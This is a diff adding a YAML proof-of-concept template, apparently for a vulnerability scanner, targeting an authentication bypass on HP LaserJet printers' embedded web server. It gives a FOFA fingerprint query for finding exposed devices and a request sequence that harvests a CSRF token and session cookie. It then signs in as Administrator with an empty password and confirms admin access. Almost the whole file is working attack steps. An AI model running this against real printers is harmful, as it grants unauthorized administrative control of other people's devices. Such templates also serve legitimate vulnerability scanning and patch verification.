@@ -1,0 +1,32 @@
+id: poc-yaml-hewlett-packard-laserjet-printer-identity-verification-bypass
+info:
+  name: 惠普激光打印机 身份验证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: hp_laserjet_printer
+  fofa: body="hp/device/SignIn/Index"
+requests:
+- method: GET
+  path: /hp/device/SignIn/Index
+  expression: status_code == 200 && contains(body,"CSRFToken")
+  output:
+  - regex_match(body,"id=\"CSRFToken\" name=\"CSRFToken\" value=\"(?P<csrftoken>.*?)\"")
+  - regex_match(headers,"sessionId=(?P<cookie1>.*?);")
+- method: POST
+  path: /hp/device/SignIn/Index
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: sessionId={{.cookie1}}
+  data: CSRFToken={{.csrftoken}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+  expression: status_code == 302
+  output:
+  - regex_match(headers,"HttpOnly\r\nSet-Cookie\x3a sessionId=(?P<cookie2>.*?); path=/")
+- method: GET
+  path: /hp/device/DeviceStatus/Index
+  headers:
+    Cookie: sessionId={{.cookie2}}
+  expression: status_code == 200 && contains(body,"User\x3a Administrator") && contains(body,"Sign
+    out")
+variables: {}
+transport: http
